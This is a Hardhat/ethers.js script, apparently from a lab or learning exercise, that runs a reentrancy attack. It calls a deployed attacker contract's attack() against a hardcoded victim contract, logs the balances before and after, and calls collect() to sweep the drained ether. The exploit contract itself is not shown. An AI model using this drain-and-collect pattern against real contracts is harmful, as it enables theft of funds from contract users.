import { network } from "hardhat";

const { ethers } = await network.create();

const VICTIM_REENTRANCY_ADDRESS = "0x38D336Cc4990D4ab228b331f08cCdF89C0d9bcC0";
const ATTACKER_ADDRESS = "0xD6d21f96aAdEEB97981207D3A6dD0fBD0a32e8BC";

const [signer] = await ethers.getSigners();
const attacker = await ethers.getContractAt("Reentrancy", ATTACKER_ADDRESS, signer);

async function main() {



  console.log("Victim balance before:", 
    ethers.formatEther(await ethers.provider.getBalance(VICTIM_REENTRANCY_ADDRESS))
  );

  // Attack — on envoie la tx directement sans simulation préalable
  const tx = await attacker.attack({ gasLimit: 500000  });
  await tx.wait();

  console.log("Victim balance after:", 
    ethers.formatEther(await ethers.provider.getBalance(VICTIM_REENTRANCY_ADDRESS))
  );

  console.log("Attacker balance:", 
    ethers.formatEther(await ethers.provider.getBalance(ATTACKER_ADDRESS))
  );
}

//main().catch(console.error);

// Collect the balance of the attacker
const collectTx = await attacker.collect({ gasLimit: 500000 });
await collectTx.wait();